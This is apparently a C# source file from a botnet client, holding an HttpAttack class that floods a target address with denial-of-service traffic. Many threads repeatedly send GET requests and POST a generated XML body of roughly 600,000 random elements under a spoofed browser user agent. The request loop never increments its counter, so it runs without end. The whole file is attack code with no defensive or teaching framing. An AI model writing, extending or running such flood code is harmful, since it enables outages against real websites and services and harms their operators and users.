using BotNet.Client.DDoS.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http.Headers;
using System.Xml;
using BotNet.Client.Extension;

namespace BotNet.Client.DDoS
{
  public class HttpAttack : IHttpAttack
  {
    private string _ip { get; set; }
    public int RequestCounter { get; set; }
    public Dictionary<Thread, ThreadState> HttpActiveThreads { get; set; }
    private string _xmlFile { get; set; }

    public HttpAttack(string ip)
    {
      _ip = ip;
      HttpActiveThreads = new Dictionary<Thread, ThreadState>();
      _xmlFile = GenerateRandomXmlFile().GetAwaiter().GetResult();
    }

    public async Task CreateAttackAsync(int requests, int maxThreads, bool? storageThreadDetails = false)
    {
      Parallel.For(0, maxThreads, index =>
      {
        Thread attackThread = new Thread(async () => await AttackAsync(requests));
        attackThread.Name = ($"HttpThread{index}");
        attackThread.Start();
      });
    } 

    private async Task AttackAsync(int requests)
    {
      var currentRequests = 0;
      var uriBuilder = new UriBuilder(_ip);
      var uri = uriBuilder.Uri;
      do
      {
        Console.WriteLine("Start attack");
        var httpClient = new HttpClient();
        httpClient.BaseAddress = uri;
        httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
        httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36");

        var postRequest = new HttpRequestMessage(HttpMethod.Post, uri);
        postRequest.Content = new StringContent(_xmlFile, Encoding.UTF8, "application/xml");

        try
        {
          Console.WriteLine(httpClient.GetAsync(uri).Wait(TimeSpan.FromSeconds(1)));
          Console.WriteLine(httpClient.GetStringAsync(uri).Wait(TimeSpan.FromSeconds(1)));
          Console.WriteLine(httpClient.GetStreamAsync(uri).Wait(TimeSpan.FromSeconds(1)));
          Console.WriteLine(httpClient.SendAsync(postRequest).Result);

          httpClient.Dispose();
        } catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
        Console.WriteLine("Finished");
        
        RequestCounter++;
      } while (currentRequests <= requests);
    }

    public async Task<string> GenerateRandomXmlFile()
    {
      Console.WriteLine("Starting to generate the necessary data for post");
      var writerSettings = new XmlWriterSettings();
      writerSettings.Async = true;
      writerSettings.OmitXmlDeclaration = true;
      writerSettings.ConformanceLevel = ConformanceLevel.Fragment;
      writerSettings.CloseOutput = false;

      var stream = new MemoryStream();
      var writer = XmlWriter.Create(stream, writerSettings);

      writer.WriteStartElement($"toplevel");

      for(int i = 0; i < 300000 * 2; i++)
      {
        writer.WriteElementString($"T{i}", "".GetRandomString());
      }

      await writer.WriteEndElementAsync();

      await writer.FlushAsync();
      stream.Position = 0;
      Console.WriteLine("Finished to generate the necessary data for post");
      return Encoding.UTF8.GetString(stream.ToArray());
    }
  }
}
